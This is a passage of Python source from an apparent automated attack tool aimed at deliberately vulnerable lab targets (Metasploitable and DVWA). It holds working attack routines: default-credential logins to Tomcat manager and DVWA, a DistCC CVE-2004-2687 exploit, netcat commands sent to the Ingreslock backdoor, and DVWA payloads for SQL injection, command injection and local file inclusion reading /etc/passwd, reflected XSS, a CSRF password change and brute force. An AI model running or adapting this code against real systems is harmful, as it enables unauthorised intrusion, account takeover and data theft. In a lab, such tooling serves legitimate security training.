            r['severity'] = 'HIGH'
            r['details'] = {'output': out[:200]}
            self.log(f"R-Service {port}: Accessible (no encryption)", "WARNING")
        return r

    # ═══════════════════════════════════════════
    # GENERIC
    # ═══════════════════════════════════════════

    def attack_banner_generic(self, ip, port_info):
        port = port_info['port']
        r = self._result("Banner Grab", ip, port)
        cmd = f"echo '' | timeout 5 nc -w3 {ip} {port} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 10)
        banner = out.strip()

        if banner:
            r['success'] = True
            r['severity'] = 'LOW'
            r['details'] = {'banner': banner[:300]}
            self.log(f"Port {port}: {banner[:80]}", "INFO")
        return r

    def attack_tomcat_manager(self, ip, port_info):
        port = port_info['port']
        r = self._result("Tomcat Manager Default Creds", ip, port)

        creds = [('tomcat', 'tomcat'), ('admin', 'admin'), ('manager', 'manager'),
                 ('tomcat', 's3cret'), ('role1', 'role1'), ('both', 'tomcat')]
        for user, passwd in creds:
            try:
                resp = requests.get(f"http://{ip}:{port}/manager/html",
                                     auth=(user, passwd), timeout=5, verify=False)
                if resp.status_code == 200 and 'manager' in resp.text.lower():
                    r['success'] = True
                    r['severity'] = 'CRITICAL'
                    r['details'] = {'user': user, 'pass': passwd}
                    self.log(f"💀 Tomcat {port}: {user}:{passwd} — FULL RCE via WAR!", "EXPLOIT")
                    return r
            except:
                pass

        self.log(f"Tomcat {port}: Default creds failed", "INFO")
        return r

    # ═══════════════════════════════════════════
    # METASPLOITABLE SPECIFIC
    # ═══════════════════════════════════════════

    def _metasploitable_attacks(self, ip, ai_results):
        results = []
        ports = set()
        for host in ai_results:
            for p in host['ports']:
                ports.add(p['port'])

        checks = {
            3632: (self.attack_distcc, "DistCC"),
            1099: (self.attack_java_rmi, "Java RMI"),
            1524: (self.attack_ingreslock, "Ingreslock Backdoor"),
            2049: (self.attack_nfs, "NFS Shares"),
            8180: (self.attack_tomcat_manager, "Tomcat Manager"),
        }

        for port, (func, name) in checks.items():
            if port in ports:
                self.attack_count += 1
                try:
                    results.append(func(ip, {'port': port, 'service': name}))
                except Exception as e:
                    self.log(f"Error in {name}: {str(e)[:100]}", "FAIL")

        return results

    def attack_distcc(self, ip, port_info):
        port = port_info['port']
        r = self._result("DistCC Exploit (CVE-2004-2687)", ip, port)
        cmd = f"nmap -p {port} --script distcc-cve2004-2687 -Pn {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 30)

        if 'VULNERABLE' in out or 'uid=' in out:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            r['details'] = {'cve': 'CVE-2004-2687', 'output': out[-500:]}
            self.log(f"💀 DistCC {port}: REMOTE CODE EXECUTION!", "EXPLOIT")
        else:
            self.log(f"DistCC {port}: Not vulnerable", "INFO")
        return r

    def attack_ingreslock(self, ip, port_info):
        port = port_info['port']
        r = self._result("Ingreslock Backdoor", ip, port)
        cmd = f"echo 'id' | timeout 5 nc -w3 {ip} {port} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 10)

        if 'uid=' in out or 'root' in out:
            r['success'] = True
            r['severity'] = 'CRITICAL'
            r['details'] = {'shell_access': True, 'output': out[:300]}
            self.log(f"💀 INGRESLOCK {port}: ROOT SHELL!", "EXPLOIT")
        elif out.strip():
            r['success'] = True
            r['severity'] = 'HIGH'
            r['details'] = {'output': out[:200]}
            self.log(f"Port {port}: Responds to input", "WARNING")
        return r

    def attack_nfs(self, ip, port_info):
        port = port_info['port']
        r = self._result("NFS Share Enumeration", ip, port)
        cmd = f"showmount -e {ip} 2>/dev/null"
        out, _, _ = self._run_cmd(cmd, 15)

        if 'Export list' in out:
            shares = re.findall(r'(/\S+)\s+(\S+)', out)
            r['success'] = True
            r['details'] = {'shares': [{'path': s[0], 'access': s[1]} for s in shares]}

            if any('*' in s[1] for s in shares):
                r['severity'] = 'CRITICAL'
                self.log(f"💀 NFS: WORLD-READABLE! {[s[0] for s in shares]}", "CRITICAL")
            else:
                r['severity'] = 'HIGH'
                self.log(f"NFS: Shares: {[s[0] for s in shares]}", "WARNING")
        return r

    # ═══════════════════════════════════════════
    # DVWA ATTACKS
    # ═══════════════════════════════════════════

    def _dvwa_attacks(self, ip, port):
        results = []
        proto = 'https' if port == 443 else 'http'
        base = f"{proto}://{ip}:{port}"

        # Check DVWA exists
        try:
            resp = requests.get(f"{base}/dvwa/login.php", timeout=5, verify=False)
            if resp.status_code != 200:
                return results
        except:
            return results

        self.log("DVWA detected! Starting web app attacks...", "INFO")

        # Login
        session = requests.Session()
        try:
            page = session.get(f"{base}/dvwa/login.php", timeout=5, verify=False)
            token_match = re.search(r"user_token'\s*value='(.*?)'", page.text)
            token = token_match.group(1) if token_match else ''

            login = session.post(f"{base}/dvwa/login.php", data={
                'username': 'admin', 'password': 'password',
                'Login': 'Login', 'user_token': token
            }, timeout=5, verify=False)

            if 'Welcome' not in login.text and 'index.php' not in login.url:
                self.log("DVWA login failed", "FAIL")
                return results

            self.log("DVWA: Logged in as admin:password!", "EXPLOIT")

            # Set security LOW
            sec_page = session.get(f"{base}/dvwa/security.php", timeout=5, verify=False)
            st = re.search(r"user_token'\s*value='(.*?)'", sec_page.text)
            if st:
                session.post(f"{base}/dvwa/security.php", data={
                    'security': 'low', 'seclev_submit': 'Submit', 'user_token': st.group(1)
                }, timeout=5, verify=False)
                self.log("DVWA: Security set to LOW", "INFO")
        except Exception as e:
            self.log(f"DVWA setup error: {str(e)[:100]}", "FAIL")
            return results

        # ─── DVWA SQLi ───
        self.attack_count += 1
        r = self._result("DVWA SQL Injection", ip, port)
        try:
            resp = session.get(
                f"{base}/dvwa/vulnerabilities/sqli/?id=1'+OR+'1'%3D'1&Submit=Submit",
                timeout=5, verify=False
            )
            if 'First name' in resp.text or 'Surname' in resp.text:
                r['success'] = True
                r['severity'] = 'CRITICAL'
                r['details'] = {'payload': "1' OR '1'='1", 'data_leaked': True}
                self.log("💀 DVWA SQLi: ALL USER DATA DUMPED!", "EXPLOIT")
        except:
            pass
        results.append(r)

        # ─── DVWA Command Injection ───
        self.attack_count += 1
        r = self._result("DVWA Command Injection", ip, port)
        try:
            resp = session.post(
                f"{base}/dvwa/vulnerabilities/exec/",
                data={'ip': '127.0.0.1; id; cat /etc/passwd', 'Submit': 'Submit'},
                timeout=5, verify=False
            )
            if 'uid=' in resp.text or 'root:' in resp.text:
                r['success'] = True
                r['severity'] = 'CRITICAL'
                r['details'] = {'payload': '; id; cat /etc/passwd', 'output': resp.text[:300]}
                self.log("💀 DVWA Command Injection: OS commands executed!", "EXPLOIT")
        except:
            pass
        results.append(r)

        # ─── DVWA XSS ───
        self.attack_count += 1
        r = self._result("DVWA Reflected XSS", ip, port)
        try:
            payload = '<script>alert("XSS")</script>'
            resp = session.get(
                f"{base}/dvwa/vulnerabilities/xss_r/?name={quote(payload)}",
                timeout=5, verify=False
            )
            if payload in resp.text:
                r['success'] = True
                r['severity'] = 'HIGH'
                r['details'] = {'payload': payload, 'reflected': True}
                self.log("💀 DVWA XSS: Script injection works!", "EXPLOIT")
        except:
            pass
        results.append(r)

        # ─── DVWA LFI ───
        self.attack_count += 1
        r = self._result("DVWA Local File Inclusion", ip, port)
        try:
            resp = session.get(
                f"{base}/dvwa/vulnerabilities/fi/?page=../../../../../../etc/passwd",
                timeout=5, verify=False
            )
            if 'root:' in resp.text:
                r['success'] = True
                r['severity'] = 'CRITICAL'
                r['details'] = {'payload': '../../../../../../etc/passwd', 'file_read': True}
                self.log("💀 DVWA LFI: /etc/passwd read!", "EXPLOIT")
        except:
            pass
        results.append(r)

        # ─── DVWA CSRF ───
        self.attack_count += 1
        r = self._result("DVWA CSRF", ip, port)
        try:
            resp = session.get(
                f"{base}/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change",
                timeout=5, verify=False
            )
            if 'Password Changed' in resp.text:
                r['success'] = True
                r['severity'] = 'HIGH'
                r['details'] = {'password_changed': True, 'new_password': 'hacked'}
                self.log("💀 DVWA CSRF: Password changed without token!", "EXPLOIT")
        except:
            pass
        results.append(r)

        # ─── DVWA Brute Force ───
        self.attack_count += 1
        r = self._result("DVWA Brute Force", ip, port)
        try:
            resp = session.get(
                f"{base}/dvwa/vulnerabilities/brute/?username=admin&password=password&Login=Login",
                timeout=5, verify=False
            )
            if 'Welcome' in resp.text:
                r['success'] = True
                r['severity'] = 'HIGH'
                r['details'] = {'user': 'admin', 'pass': 'password', 'no_rate_limit': True}
                self.log("💀 DVWA Brute Force: No rate limiting!", "EXPLOIT")
        except:
            pass
        results.append(r)

        return results
